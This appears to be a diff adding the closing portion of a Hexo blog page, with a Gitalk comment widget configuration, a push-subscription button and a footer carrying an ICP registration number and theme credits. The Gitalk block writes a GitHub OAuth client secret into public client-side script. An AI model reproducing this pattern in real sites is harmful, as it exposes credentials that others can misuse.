+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: '4283629b368b1cf98f81',
+        clientSecret: '8bb6ce27010c0db8286e943f3765aeae1757de4d',
+        repo: 'xyyBlog',
+        owner: 'rdzfv',
+        admin: 'rdzfv',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 10,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: true
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+
+
+        </div>
+        <footer id="footer" class="footer">
+   <div class="copyright">
+    <div style="position:fixed;left:8%;bottom:5%;">
+        <div id="webpushr-subscription-button" data-button-text="订阅本站" data-subscriber-count-text="人已订阅" data-background-color="#000000"></div>
+    </div>
+    <div style="display:inline-block;">
+        <div> <a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/" style="text-decoration: none;color: black;" >浙ICP备19012712号</a> </div>
+        <span>© xyy | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
